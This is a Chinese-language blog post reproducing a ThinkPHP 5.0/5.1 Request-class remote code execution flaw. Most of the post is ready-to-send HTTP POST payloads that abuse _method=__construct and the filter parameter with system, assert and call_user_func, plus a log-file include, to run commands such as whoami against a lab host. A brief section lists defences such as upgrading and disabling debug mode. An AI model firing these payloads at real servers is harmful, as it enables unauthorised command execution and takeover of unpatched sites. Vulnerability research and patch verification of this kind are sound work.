---
title: ThinkPHP5 核心类 Request 远程代码漏洞分析
categories:
  - 漏洞复现
tags:
  - 漏洞
  - RCE
  - 漏洞复现
  - ThinkPHP 5
  - ThinkPHP
author: Chace
date: 2020-07-11 18:47:35
---
# ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc



# 漏洞介绍

2019年1月11日，ThinkPHP团队发布了一个[补丁更新](https://blog.thinkphp.cn/910675)，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。

ThinkPHP官方发布新版本5.0.24，在1月14日和15日又接连发布两个更新，这三次更新都修复了一个安全问题，该问题可能导致远程代码执行 ，这是ThinkPHP近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。

之前写过一篇文章《[ThinkPHP-5-代码执行漏洞复现-POC](https://chaceshadow.github.io/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce)》里面有提过一次，这篇文章主要对其不同版本下进行详细的复现。

<!--more-->

# 影响版本

启明星辰ADLab安全研究员对ThinkPHP的多个版本进行源码分析和验证后，确认具体受影响的版本为ThinkPHP5.0-5.0.23完整版。



# 漏洞复现

本地环境采用ThinkPHP 5.0.10和5.0.22完整版+PHP7.0.9+Apache2.4.39进行复现。安装环境后执行POC即可执行系统命令

## 版本 5.0.0-5.0.12
> Payload：

```http
POST /public/index.php?s=index/index/index HTTP/1.1
Host: 192.168.1.236
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

s=whoami&_method=__construct&filter[]=system
```

POC执行结果如下图：   
   ![](1.png)

   ![](2.png)



## 版本 5.0.12-5.0.23

在5.0.12之后的版本中，在`thinkphp/library/think/App.php的module`方法中增加了设置filter过滤属性的代码

   ![](3.png)

开启debug调试模式，打开配置文件`config.php`

   ![](4.png)

修改为

   ![](5.png)



  >Payload 1

  ```http
POST /public/index.php HTTP/1.1
Host: 192.168.1.236
Content-Length: 76
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: thinkphp_show_page_trace=0|0
Connection: close

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
  ```

POC执行结果如下图：   

   ![](6.png)
   ![](7.png)

  >Payload 2

  ```http
POST /public/index.php HTTP/1.1
Host: 192.168.1.236
Content-Length: 76
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: thinkphp_show_page_trace=0|0
Connection: close

_method=__construct&filter[]=think\__include_file&server[]=phpinfo&get[]=../runtime/log/202007/08.log&x=phpinfo();
  ```

POC执行结果如下图：   

   ![](8.png)
   ![](9.png)

  >Payload 3

  ```http
POST /public/index.php HTTP/1.1
Host: 192.168.1.236
Content-Length: 76
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: thinkphp_show_page_trace=0|0
Connection: close

_method=__construct&filter[]=assert&server[]=phpinfo&get[]=phpinfo()
  ```

POC执行结果如下图：   

   ![](10.png)


  >Payload 4

  ```http
POST /public/index.php HTTP/1.1
Host: 192.168.1.236
Content-Length: 76
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: thinkphp_show_page_trace=0|0
Connection: close

_method=__construct&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo
  ```

POC执行结果如下图：   

   ![](11.png)

## 版本 5.1.10（PHP7.3.4+Apache2.4.39）

5.1和5.2两个版本现在用的很少，并且针对于这两个版本有点鸡肋，需要index.php文件中跳过报错提示。 语句：error_reporting(0);

需设置 `error_reporting(0);`

>  Payload：

```http
POST /public/index.php HTTP/1.1
Host: 192.168.1.236
Content-Length: 76
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: thinkphp_show_page_trace=0|0
Connection: close

c=system&f=whoami&_method=filter
```

一开始执行结果如下图：

![](12.png)

找到RuleGroup.php 新增一行代码error_reporting(0);跳过报错

![](13.png)

然后查看结果

![](14.png)

# 漏洞防御

1. 线上环境建议关闭debug模式

2. 升级到ThinkPHP 5.0.24

3. 手动增加过滤，在`thinkphp/library/think/Request.php`添加如下代码：

   ![](15.png)
   
   

# 参考链接

[ThinkPHP5 远程代码执行漏洞分析](https://seaii-blog.com/index.php/2019/01/14/88.html)

[ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析](https://xz.aliyun.com/t/3845#toc-0)

[ThinkPHP5 核心类 Request 远程代码漏洞分析](https://paper.seebug.org/787/)

[ThinkPHP 5.0.x、5.1.x、5.2.x 全版本远程命令执行漏洞](https://blog.csdn.net/csacs/article/details/86668057)